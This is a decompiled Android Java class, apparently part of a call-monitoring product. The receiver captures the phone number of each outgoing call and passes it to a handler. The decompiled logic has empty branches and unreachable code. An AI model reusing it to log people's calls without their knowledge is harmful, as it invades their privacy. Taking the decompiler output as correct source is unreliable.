package com.vvt.callhandler.phonestate;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class OutgoingCallReceiver
  extends BroadcastReceiver
{
  private static final boolean a = com.vvt.ak.a.a;
  private static com.vvt.callhandler.a b;
  
  public static void a(com.vvt.callhandler.a parama)
  {
    b = parama;
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    boolean bool1 = a;
    if (bool1) {}
    paramIntent.getStringExtra("state");
    String str = paramIntent.getStringExtra("android.intent.extra.PHONE_NUMBER");
    boolean bool2 = a;
    if (bool2) {}
    com.vvt.callhandler.a locala = b;
    if (locala != null)
    {
      bool2 = a;
      if (bool2) {}
      locala = b;
      locala.b(str);
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      bool1 = a;
      if (!bool1) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/phonestate/OutgoingCallReceiver.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */